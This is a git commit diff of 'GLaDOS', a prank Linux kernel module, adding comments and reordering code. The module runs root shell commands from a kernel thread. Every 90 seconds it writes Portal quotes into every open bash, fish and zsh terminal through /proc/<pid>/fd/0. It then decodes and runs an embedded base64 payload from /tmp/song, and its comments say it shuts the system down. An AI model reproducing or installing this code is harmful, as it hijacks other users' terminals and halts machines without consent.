dc49ae978b68c8be0b7d97a911fa2266727c522b
Alex Interrante-Grant <a.interrantegrant@gmail.com>
2017-10-19 16:20:11 -0400

    minor refactoring and comments

--- GLaDOS.c
+++ GLaDOS.c
@@ -8,9 +8,12 @@
 #define FILENAME "/tmp/song"
 #define INTERVAL_SECONDS 90
 
-int stop;
-struct task_struct *task;
+// list of GLaDOS quotes (from quotes.txt)
+char *quotes[] = {
+#include "quotes.txt"
+NULL };
 
+// generic environment for root
 static char *envp[] = {
     "SHELL=/bin/bash",
     "HOME=/root",
@@ -21,9 +24,16 @@ static char *envp[] = {
     NULL
 };
 
+int stop = 0;
+int taunt_counter = 0;
+struct task_struct *task;
+
 #define SAY "/usr/bin/pgrep -f 'bash|fish|zsh' | /usr/bin/xargs /usr/bin/printf '/proc/%%d/fd/0\n' | /usr/bin/xargs -I file /bin/sh -c 'echo %s > file &'"
 
 static void GLaDOS_say(char *message) {
+    // write a given message to the stdout for all open shells on the system
+    // (handles bash, fish, and zsh)
+
     char cmd[512];
     char *argv[] = { "/bin/bash", "-c", cmd, NULL };
 
@@ -31,18 +41,20 @@ static void GLaDOS_say(char *message) {
     call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
 }
 
-char *quotes[] = {
-#include "quotes.txt"
-NULL };
-
-int taunt_counter = 0;
-
 static void GLaDOS_taunt(void) {
+    // taunt the user of the system - this will print quotes to all terminals
+    // until it runs out of quotes then print the portal song (song/song.c) and
+    // shut down the system
+
     if(taunt_counter < 30) {
         GLaDOS_say(quotes[taunt_counter]);
         taunt_counter++;
     }
     else if (taunt_counter == 30) {
+        #ifdef DEBUG
+        printk("[GLaDOS][+] cake\n");
+        #endif
+
         char *cake = "/bin/echo "
         #include "song/song_b64.txt"
         " | /usr/bin/base64 -d > " FILENAME "; /bin/chmod 777 " FILENAME "; "
@@ -56,11 +68,13 @@ static void GLaDOS_taunt(void) {
 }
 
 int GLaDOS_thread(void *data) {
-    stop = 0;
+    // the main kernel thread function - we need a kernel thread here because
+    // we need to be able to block on calls to call_usermodehelper without
+    // locking the system
 
     while(true) {
         #ifdef DEBUG
-        printk("[GLaDOS][+] cake\n");
+        printk("[GLaDOS][+] taunted\n");
         #endif
 
         GLaDOS_taunt();
@@ -71,6 +85,8 @@ int GLaDOS_thread(void *data) {
 }
 
 static int __init GLaDOS_init(void) {
+    // kmod init function - just start the kernel thread here
+
     #ifdef DEBUG
     printk("[GLaDOS][+] installed\n");
     #endif
@@ -81,6 +97,9 @@ static int __init GLaDOS_init(void) {
 }
 
 static void __exit GLaDOS_exit(void) {
+    // kmod exit function - send a stop signal to the thread and ask it nicely
+    // to stop. This can take some time and causes rmmod to appear to hang
+
     stop = 1;
     kthread_stop(task);
 
